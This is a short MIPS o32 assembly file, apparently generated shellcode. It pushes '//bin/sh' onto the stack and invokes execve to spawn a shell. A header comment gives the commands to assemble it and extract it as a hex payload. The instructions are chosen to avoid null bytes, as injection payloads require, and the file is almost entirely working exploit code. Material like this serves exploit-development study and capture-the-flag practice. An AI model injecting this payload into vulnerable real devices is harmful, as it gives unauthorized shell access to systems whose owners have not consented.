/*
Remember to change `-march=mips32r2` to `-march=mips32r6` for Release 6 code

/usr/bin/mips-linux-gnu-as -EB -32 -march=mips32r2 -o /tmp/sc.o shellcode_o32.s && /usr/bin/mips-linux-gnu-objcopy -j .shellcode -Obinary /tmp/sc.o /tmp/sc.bin && xxd -p /tmp/sc.bin | tr -d '\n' && echo
*/

.section .shellcode,"awx"
.global _start
.global __start
_start:
__start:
.set noreorder
.p2align 2
/* execve(path='//bin/sh', argv=NULL, envp=NULL) */
    /* push b'//bin/sh\x00' */
    li $t1, 0x2f2f6269
    sw $t1, -12($sp)
    li $t1, 0x6e2f7368
    sw $t1, -8($sp)
    sw $zero, -4($sp)
    addiu $sp, $sp, -12
    add $a0, $sp, $0 /* mov $a0, $sp */
    /* set a1 to 0 */
    slti $a1, $zero, 0xFFFF /* $a1 = 0 */
    /* set a2 to 0 */
    slti $a2, $zero, 0xFFFF /* $a2 = 0 */
    /* call execve() */
    ori $v0, $zero, (4000 + 11)
    syscall 0x40404
